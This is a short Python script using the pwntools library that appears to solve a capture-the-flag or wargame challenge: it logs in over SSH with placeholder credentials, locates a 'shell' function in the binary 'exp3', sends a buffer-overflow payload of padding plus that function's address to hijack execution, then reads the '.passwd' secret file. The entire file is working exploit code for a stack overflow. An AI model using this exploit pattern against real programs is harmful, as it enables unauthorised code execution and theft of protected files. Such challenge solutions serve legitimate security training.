#!/usr/bin/env python3
import pwn
import os.path

file = './exp3' 
s = pwn.ssh('login',
            'host',
            password='password',
            port=12345)

if not os.path.isfile(file):
    s.download(file)

shell_addr=pwn.ELF(file).symbols['shell']
print('Shell addr :' + str(hex(shell_addr)))

p = s.process(file)
n = pwn.cyclic_find(b'uaac')

print(b'payload: '+(b'A'*n)+pwn.p64(shell_addr))
p.sendline((b'A'*n)+pwn.p64(shell_addr))
p.sendline(b'cat .passwd')

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
p.close()

